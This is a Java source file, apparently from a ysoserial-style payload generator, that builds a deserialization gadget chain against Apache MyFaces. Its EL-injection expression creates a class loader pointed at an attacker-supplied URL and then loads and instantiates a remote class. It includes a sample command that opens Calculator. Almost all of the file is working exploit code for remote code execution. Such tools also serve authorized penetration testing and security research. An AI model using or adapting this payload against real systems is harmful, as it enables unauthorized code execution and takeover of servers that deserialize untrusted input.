package com.ppp.chain.myface;

import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;

/**
 * ValueExpressionImpl.getValue(ELContext)
 * ValueExpressionMethodExpression.getMethodExpression(ELContext)
 * ValueExpressionMethodExpression.getMethodExpression()
 * ValueExpressionMethodExpression.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 * <p>
 * Arguments:
 * - base_url:classname
 * <p>
 * Yields:
 * - Instantiation of remotely loaded class
 * <p>
 * Requires:
 * - MyFaces
 * - Matching EL impl (setup POM deps accordingly, so that the ValueExpression can be deserialized)
 *
 * @author mbechler
 */
@Dependencies({""})
@Authors({Authors.MBECHLER})
@Sink({Sink.EL})
public class Myfaces2 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
//        PayloadRunner.run(Myfaces1.class, args);

        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(Myfaces2.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.DEFAULT);
        sinksHelper.setCommand("open -a Calculator.app");
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setExtendsAbstractTranslet(true);
        sinksHelper.setJavaClassHelper(javaClassHelper);

        PayloadRunner.run(Myfaces2.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        String command = sinksHelper.getCommand();

        Object kickOffObject = getChain(command);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        int sep = command.lastIndexOf(':');
        if (sep < 0) {
            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
        }

        String url = command.substring(0, sep);
        String className = command.substring(sep + 1);

        // based on http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/
        String expr = "${request.setAttribute('arr',''.getClass().forName('java.util.ArrayList').newInstance())}";

        // if we add fewer than the actual classloaders we end up with a null entry
        for (int i = 0; i < 100; i++) {
            expr += "${request.getAttribute('arr').add(request.servletContext.getResource('/').toURI().create('" + url + "').toURL())}";
        }
        expr += "${request.getClass().getClassLoader().newInstance(request.getAttribute('arr')"
                + ".toArray(request.getClass().getClassLoader().getURLs())).loadClass('" + className + "').newInstance()}";

        Myfaces1 myfaces1 = new Myfaces1();
        return myfaces1.getChain(expr);
    }
}
